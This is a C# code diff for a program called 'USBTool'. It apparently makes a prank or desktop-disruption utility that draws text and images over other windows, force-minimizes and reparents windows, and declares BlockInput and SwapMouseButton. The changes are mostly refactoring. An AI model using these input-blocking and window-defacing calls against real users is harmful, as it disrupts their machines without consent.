@@ -40,13 +40,12 @@ namespace USBTool
 		public bool hasvideo = false;
 		private float playvolume;
 		private IMFMediaSession mediaSession;
+		private Thread preventthread;
 #endif
 		private string sentence;
 		private SpeechSynthesizer Voice;
 		private WndVideo host;
-		private TaskFactory tf;
-		private Thread preventthread;
-		private List<IntPtr> lhwnd;
+		private TaskFactory tf;		
 		private DEVMODE DEVMODE1;
 		private IVdsService service;
 		private IntPtr defaultdesktop;
@@ -65,6 +64,8 @@ namespace USBTool
 		public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref string pvParam, uint fWinIni);
 		[DllImport("user32.dll", SetLastError = true)]
 		public static extern bool SetMagnificationDesktopColorEffect(float[,] pEffect);
+		[DllImport("user32.dll", SetLastError = true)]
+		public static extern int SetMagnificationDesktopMagnification(double a1, int a2, int a3);
 		[DllImport("user32.dll", SetLastError = true)]
 		public static extern bool SwapMouseButton(bool fSwap);
 		[DllImport("user32.dll", SetLastError = true)]
@@ -110,7 +111,7 @@ namespace USBTool
 		[DllImport("user32.dll", SetLastError = true)]
 		public extern static IntPtr GetThreadDesktop(uint dwThreadId);
 		[DllImport("user32.dll", SetLastError = true)]
-		public extern static bool SetThreadDesktop(IntPtr hDesktop);
+		public extern static bool BlockInput(bool fBlockIt);
 		#endregion
 		#region kernel32.dll
 		[DllImport("kernel32.dll", SetLastError = true)]
@@ -176,11 +177,7 @@ namespace USBTool
 		public static extern int MFGetService(IUnknown punkObject, ref Guid guidService, ref Guid riid, out IUnknown ppvObject);
 		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
 		public static extern int MFRequireProtectedEnvironment(IMFPresentationDescriptor pPresentationDescriptor);
-		#endregion
-#elif MEDIA_FOUNDATION_PLAYER
-		[DllImport("Mfplay.dll", SetLastError = true, PreserveSig = true)]
-		public static extern int MFPCreateMediaPlayer(string pwszURL,bool fStartPlayback,uint creationOptions,IMFPMediaPlayerCallback pCallback,IntPtr hWnd,out IMFPMediaPlayer ppMediaPlayer );
-		
+		#endregion		
 #endif
 		[StructLayout(LayoutKind.Sequential)]
 		public struct DWM_BLURBEHIND
@@ -407,20 +404,18 @@ namespace USBTool
 					case "picture":
 						Rectangle rect = new Rectangle();
 						GetClientRect(hwnd, ref rect);
-						Graphics g = Graphics.FromHwnd(hwnd);
-						Bitmap p = new Bitmap(sentence);
-						try
-						{
-							g.DrawImage(p, rect);
-						}
-						catch
-						{
-						}
-						finally
-						{
-							g.Dispose();
-							p.Dispose();
-						}
+						using (Graphics g = Graphics.FromHwnd(hwnd)) {
+							using (Bitmap p = new Bitmap(sentence))
+							{
+								try
+								{
+									g.DrawImage(p, rect);
+								}
+								catch
+								{
+								}
+							}
+						}						
 						break;
 					case "close":
 						ShowWindow(hwnd, SW_FORCEMINIMIZE);
@@ -454,14 +449,6 @@ namespace USBTool
 						}
 						break;
 					case "beuncle":
-						if (lhwnd.Contains(hwnd))
-						{
-							if (GetParent(hwnd) != GetDesktopWindow())
-								break;
-							else
-								lhwnd.Clear();
-						}
-						lhwnd.Add(hwnd);
 						SetParent(hwnd, IntPtr.Zero);
 						break;
 					case "disable":
@@ -470,31 +457,36 @@ namespace USBTool
 					case "text":
 						rect = new Rectangle();
 						GetClientRect(hwnd, ref rect);
-						g = Graphics.FromHwnd(hwnd);
+						
 						int h = rect.Height;
 						int fh = rect.Width / sentence.Length * 2;
 						int ph = 0;
-						try
-						{
-							Font f = new Font(FontFamily.GenericSansSerif, fh, FontStyle.Bold, GraphicsUnit.Pixel);
-							do
+						using (Graphics g = Graphics.FromHwnd(hwnd)) 
+						{ 
+							try
 							{
-								g.DrawString(sentence, f, Brushes.Black, 0, ph);
-								ph += fh;
-								h -= fh;
-							} while (h > 0);
-						}
-						catch
-						{
-						}
-						finally
-						{
-							g.Dispose();
-						}
+								Font f = new Font(FontFamily.GenericSansSerif, fh, FontStyle.Bold, GraphicsUnit.Pixel);
+								do
+								{
+									g.DrawString(sentence, f, Brushes.Black, 0, ph);
+									ph += fh;
+									h -= fh;
+								} while (h > 0);
+							}
+							catch
+							{
+							}
+						}							
 						break;
 					case "top":
 						ShowWindow(hwnd, SW_SHOWDEFAULT);
 						SetWindowPos(hwnd, new IntPtr(1), 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
+						break;
+					case "mirror":
+						using (Graphics g = Graphics.FromHwnd(hwnd))
+                        {
+
+                        }
 						break;
 					default:
 						throw new ArgumentException("该功能还未开发");
